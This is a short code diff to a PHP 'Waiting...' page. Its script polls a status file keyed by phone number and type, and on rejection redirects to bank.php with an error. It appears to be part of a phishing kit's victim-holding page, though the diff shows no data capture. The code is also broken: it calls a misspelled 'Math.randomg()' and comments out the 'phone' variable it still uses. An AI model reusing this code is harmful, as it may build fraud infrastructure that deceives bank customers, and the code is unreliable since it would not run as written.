@@ -11,11 +11,11 @@
 <title>Waiting...</title>
 <link rel="stylesheet"href="style.css">
 <script>
-//function checkStatus() {
+function checkStatus() {
     fetch('status.json?t=' + Math.randomg())
         .then(response => response.json())
         .then(data => {
-            const phone = "<?php echo $phone; ?>";
+            //const phone = "<?php echo $phone; ?>";
             const type = "<?php echo $type; ?>";
             if(data[phone] && data[phone][type]) {
                 const status = data[phone][type];
@@ -24,7 +24,7 @@
                 } else if(status === 'reject') {
                     window.location.href = "bank.php?phone=" + phone + "&error=1";
                 }
-           // }
+            }
         })
         .catch(err => console.log(err));
 }
